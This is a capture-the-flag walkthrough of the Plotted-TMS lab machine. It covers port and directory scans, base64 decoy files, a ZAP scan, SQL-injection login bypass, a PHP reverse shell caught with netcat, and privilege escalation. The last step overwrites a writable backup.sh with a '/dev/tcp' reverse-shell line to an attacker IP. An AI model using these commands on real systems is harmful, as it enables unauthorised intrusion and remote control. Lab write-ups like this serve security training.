

<h3>nmap</h3>

```bash
:~/Plotted-TMS# nmap -sS -sS -p -Pn -T4 TargetIP
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp open  microsoft-ds
...
Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
```

<h3>dirsearch</h3>

```bash
:~/Plotted-TMS# dirb http://TargetP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
...
GENERATED WORDS: 4612                                                          

---- Scanning URL: http://TargetIP/ ----
==> DIRECTORY: http://TargetIP/admin/                                                                                                      
+ http:/TargetIP/index.html (CODE:200|SIZE:10918)                                                                                         
+ http://TargetIP/passwd (CODE:200|SIZE:25)                                                                                                
+ http://TargetIP/server-status (CODE:403|SIZE:277)                                                                                        
+ http:/TargetIP/shadow (CODE:200|SIZE:25)                                                                                                
                                                                                                                                               
---- Entering directory: http://TargetIP/admin/ ----
...
+ http://TargetIP/admin/id_rsa (CODE:200|SIZE:81) 
Task Completed
```

```bash
:~/Plotted-TMS# dirb http:/TargetIP:445 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
...
GENERATED WORDS: 4612                                                          

---- Scanning URL: http://TargetIP:445/ ----
+ http:/TargetIP:445/index.html (CODE:200|SIZE:10918)                                                                                             
==> DIRECTORY: http://TargetIP:445/management/                                                                                                     
+ http://TargetIP:445/server-status (CODE:403|SIZE:278)                                                                                            
                                                                                                                                                       
---- Entering directory: http://TargetIP:445/management/ ----
==> DIRECTORY: http://TargetIP:445/management/admin/                                                                                               
==> DIRECTORY: http://TargetIP:445/management/assets/                                                                                              
==> DIRECTORY: http://TargetIP:445/management/build/                                                                                               
==> DIRECTORY: http://TargetIP:445/management/classes/                                                                                             
==> DIRECTORY: http://TargetIP:445/management/database/                                                                                            
==> DIRECTORY: http://10.10.96.120:445/management/dist/                                                                                                
==> DIRECTORY: http://10.10.96.120:445/management/inc/                                                                                                 
+ http://10.10.96.120:445/management/index.php (CODE:200|SIZE:14506)                                                                                   
==> DIRECTORY: http://10.10.96.120:445/management/libs/                                                                                                
==> DIRECTORY: http://10.10.96.120:445/management/pages/                                                                                               
==> DIRECTORY: http://10.10.96.120:445/management/plugins/                                                                                             
==> DIRECTORY: http://10.10.96.120:445/management/uploads/                                                                                             
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/admin/ ----
==> DIRECTORY: http://10.10.96.120:445/management/admin/drivers/                                                                                       
==> DIRECTORY: http://10.10.96.120:445/management/admin/inc/                                                                                           
+ http://10.10.96.120:445/management/admin/index.php (CODE:200|SIZE:22279)                                                                             
==> DIRECTORY: http://10.10.96.120:445/management/admin/maintenance/                                                                                   
==> DIRECTORY: http://10.10.96.120:445/management/admin/reports/                                                                                       
==> DIRECTORY: http://10.10.96.120:445/management/admin/user/                                                                                          
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
==> DIRECTORY: http://10.10.96.120:445/management/assets/css/                                                                                          
==> DIRECTORY: http://10.10.96.120:445/management/assets/js/                                                                                           
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/build/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
==> DIRECTORY: http://10.10.96.120:445/management/build/config/                                                                                        
==> DIRECTORY: http://10.10.96.120:445/management/build/js/                                                                                            
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/classes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/database/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/dist/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
==> DIRECTORY: http://10.10.96.120:445/management/dist/css/                                                                                            
==> DIRECTORY: http://10.10.96.120:445/management/dist/img/                                                                                            
==> DIRECTORY: http://10.10.96.120:445/management/dist/js/                                                                                             
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/inc/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/libs/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
==> DIRECTORY: http://10.10.96.120:445/management/libs/css/                                                                                            
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/pages/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/plugins/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
==> DIRECTORY: http://10.10.96.120:445/management/plugins/jquery/                                                                                      
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
==> DIRECTORY: http://10.10.96.120:445/management/uploads/drivers/                                                                                     
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/admin/drivers/ ----
+ http://10.10.96.120:445/management/admin/drivers/index.php (CODE:500|SIZE:0)                                                                         
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/admin/inc/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/admin/maintenance/ ----
+ http://10.10.96.120:445/management/admin/maintenance/index.php (CODE:500|SIZE:0)                                                                     
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/admin/reports/ ----
+ http://10.10.96.120:445/management/admin/reports/index.php (CODE:500|SIZE:0)                                                                         
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/admin/user/ ----
+ http://10.10.96.120:445/management/admin/user/index.php (CODE:500|SIZE:0)                                                                            
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/assets/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/assets/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/build/config/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/build/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/dist/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
==> DIRECTORY: http://10.10.96.120:445/management/dist/css/alt/                                                                                        
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/dist/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/dist/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
==> DIRECTORY: http://10.10.96.120:445/management/dist/js/pages/                                                                                       
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/libs/css/ ----
+ http://10.10.96.120:445/management/libs/css/index.php (CODE:200|SIZE:0)                                                                              
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/plugins/jquery/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/uploads/drivers/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/dist/css/alt/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/dist/js/pages/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
```

<h3>TargetIP/passwd</h3>

```bash
bm90IHRoaXMgZWFzeSA6RA==
```

<p>=</p>

```bash
not this easy :D
```

![image](https://github.com/user-attachments/assets/45c89e5e-1df2-41cc-a729-07888365a8e4)


<h3>TargetIP/shadow</h3>

```bash
bm90IHRoaXMgZWFzeSA6RA==
```

<p>=</p>

```bash
not this easy :D
```

![image](https://github.com/user-attachments/assets/e2bc9879-bd97-4a8d-a226-698c41182a88)


<h3>TargetIP/admin/id_rsa</h3>

```bash
VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE
```

![image](https://github.com/user-attachments/assets/2eac86d4-50e2-49b6-b153-1089e0584b63)

<h3>CyberChef</h3>
<p>Trust me it is not this easy..now get back to enumeration :D</p>

![image](https://github.com/user-attachments/assets/4c335d7c-c125-4bd4-a8e7-c9cc002a79b9)

<h3>TargetIP:445/management</h3>
<p>

- Login<br>
- Tommy Lasorda<br>
- CopyrightTOMS 2021<br>
- Developed By: oretnom23<br>
- oretnom23@gmail.com<br>
- /management/dist/js/script.js<br>
- /management/assets/js/scripts.js<br>
- background-image:url(/management/uploads/1629334140_traffic_bg.jpg);<br>
- Login: /management/admin</p>

![image](https://github.com/user-attachments/assets/bd821694-b3ae-49fb-bc52-c911681ef7a1)


<h3>OWASP ZAP</h3>

```bash
:~/Plotted-TMS# sudo snap install zaproxy --classic
...
:~/Plotted-TMS# xaproxy
```

![image](https://github.com/user-attachments/assets/07289bd8-a76b-452d-8cfd-1b3c97610566)

<br>

<p>

- clicked <code>Automated Scan</code><br>
- URL to attack: http://<code>TargetIP>/code>
</p>

![image](https://github.com/user-attachments/assets/f7d7774a-0a00-4cab-b72c-f6142af38cc4)

![image](https://github.com/user-attachments/assets/aa079c62-6203-44b7-9b9c-440b682c4fcb)

<p>- URL to attack: http://<code>TargetIP:445</code>p>
  
![image](https://github.com/user-attachments/assets/1d94c05e-ac7c-41e0-9d67-0e940e6eb06f)

![image](https://github.com/user-attachments/assets/9d6a8fc9-1a1a-455e-a158-ac73f03c74a7)

<br>

<h3>SQL Injection</h3>

![image](https://github.com/user-attachments/assets/45417d28-827f-42f8-9f64-4784cdbd08bd)

<h3>http://10.10.96.120:445/management/admin/login.php</h3>

![image](https://github.com/user-attachments/assets/92eb1c7c-3f0a-40fe-8a8d-d4ad569e1bee)

![image](https://github.com/user-attachments/assets/2e8e8086-cb42-458a-b510-4cfa8764d64d)

![image](https://github.com/user-attachments/assets/7053be1b-60ed-41be-a300-67c99807adb5)


<h3>Reverse shell</h3>
<p>php</p>

![image](https://github.com/user-attachments/assets/de4576c4-780b-427f-b9cb-1fe41e918bd3)


<h3>listener</h3>

```bash
:~/Plotted-TMS# nc -nlvp 4444
```

<h3>Loaded <code>rev.php</code></h3>

![image](https://github.com/user-attachments/assets/84ff886f-d653-4257-ac5d-3134fd663e95)

<h3>shell</h3>

```bash
:~/Plotted-TMS# nc -nlvp 4444
```

<h3>Stabilized</h3>

```bash
:~/Plotted-TMS# nc -nlvp 4444
...
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@plotted:/$ ^Z
[1]+  Stopped                 nc -nlvp 4444
:~/Plotted-TMS# stty raw -echo; fg
nc -nlvp 4444

www-data@plotted:/$ 
```

<h3>scripts</h3>

```bash
www-data@plotted:/var/www/scripts$ ls -lah
total 12K
drwxr-xr-x 2 www-data   www-data   4.0K Oct 28  2021 .
drwxr-xr-x 4 root       root       4.0K Oct 28  2021 ..
-rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28  2021 backup.sh
www-data@plotted:/var/www/scripts$ cat backup.sh
#!/bin/bash

/usr/bin/rsync -a /var/www/html/management /home/plot_admin/tms_backup
/bin/chmod -R 770 /home/plot_admin/tms_backup/management
www-data@plotted:/var/www/scripts$ 
```

```bash
www-data@plotted:/var/www/scripts$ rm backup.sh
rm: remove write-protected regular file 'backup.sh'? y
www-data@plotted:/var/www/scripts$ touch backup.sh
www-data@plotted:/var/www/scripts$ echo "/bin/sh -i >& /dev/tcp/10.10.98.235/9001 0>&1" > backup.sh 
```


```bash
www-data@plotted:/var/www/scripts$ chmod +x backup.sh
www-data@plotted:/var/www/scripts$ ls -lah
total 12K
drwxr-xr-x 2 www-data www-data 4.0K Jul  6 19:42 .
drwxr-xr-x 4 root     root     4.0K Oct 28  2021 ..
-rwxrwxrwx 1 www-data www-data   46 Jul  6 19:44 backup.sh
www-data@plotted:/var/www/scripts$
```



